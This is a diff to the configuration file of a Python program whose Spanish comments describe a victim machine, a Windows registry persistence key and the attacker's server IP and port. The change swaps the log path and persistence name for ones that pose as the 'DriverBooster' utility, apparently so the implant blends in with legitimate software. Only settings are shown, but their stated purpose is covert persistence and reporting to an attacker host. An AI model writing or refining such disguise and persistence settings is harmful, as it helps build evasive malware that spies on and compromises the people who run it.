@@ -6,10 +6,10 @@ Modificar estos valores para ajustar el comportamiento sin tocar la lógica.
 import os
 
 # Ruta del log local en la máquina víctima
-LOG_FILE = os.path.join(os.environ["APPDATA"], "svchost_log.txt")
+LOG_FILE = os.path.join(os.environ["APPDATA"], "DriverBooster", "logs", "cache.dat")
 
 # Nombre del proceso en el registro de Windows (clave de persistencia)
-APP_NAME = "WindowsUpdateService"
+APP_NAME = "DriverBooster Scheduler 10.4"
 
 # IP y puerto del servidor del atacante
 SERVER_HOST = "195.0.1.5"   # Cambiar por la IP real del atacante
